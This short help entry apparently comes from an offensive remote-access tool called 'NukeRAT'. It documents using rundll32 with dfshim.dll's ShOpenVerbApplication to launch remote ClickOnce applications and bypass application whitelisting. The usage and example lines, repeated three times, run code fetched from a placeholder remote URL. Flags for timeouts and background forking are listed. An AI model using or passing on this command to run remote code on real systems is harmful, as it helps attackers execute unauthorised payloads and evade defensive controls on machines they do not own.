ABOUT
    .NET ClickOnce engine host.
    Often reached through rundll32 dfshim ShOpenVerbApplication to run
    remote ClickOnce apps and bypass AWL.

USAGE:
    rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}

EXAMPLES:
    rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
